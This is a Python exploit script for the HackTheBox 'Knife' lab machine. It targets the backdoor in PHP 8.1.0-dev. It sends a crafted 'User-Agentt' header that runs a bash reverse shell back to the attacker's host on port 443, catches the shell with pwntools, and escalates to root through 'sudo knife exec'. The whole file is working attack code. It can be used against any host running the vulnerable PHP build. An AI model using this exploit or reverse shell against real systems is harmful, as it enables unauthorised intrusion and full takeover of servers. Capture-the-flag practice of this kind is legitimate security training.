#!/usr/bin/python3

# HackTheBox - Knife
# Vulnerability: User-Agent PHP 8.1.0-dev

from pwn import *
import requests

def def_handler(sig, frame):
    print("\nExiting... Be patient!")
    sys.exit(1)

#Ctrl + C
signal.signal(signal.SIGINT, def_handler)

# Global Variables
main_url = 'http://10.10.10.242/'
lport = 443

def makeRequest():
    headers = {
        'User-Agentt': 'zerodiumsystem("bash -c \'bash -i >& /dev/tcp/10.10.14.22/443 0>&1\'");'
    }

    r = requests.get(main_url, headers=headers)


if __name__ == '__main__':

    p1 = log.progress("Pwn web")
    p1.status("PHP 8.1.0-dev - User-Agent Remote Code Execution")

    time.sleep(4)

    try:
        threading.Thread(target=makeRequest, args=()).start()
    except Exception as e:
        pass

    shell = listen(lport, timeout=20).wait_for_connection()

    if shell.sock is None:
        p1.failure("Autopwn could not get access to the system.")
        sys.exit(1)
    else:
        p1.success("Your target was hacked successfully!")
        shell.sendline("sudo knife exec -E 'exec \"/bin/sh\"'")
        shell.interactive()
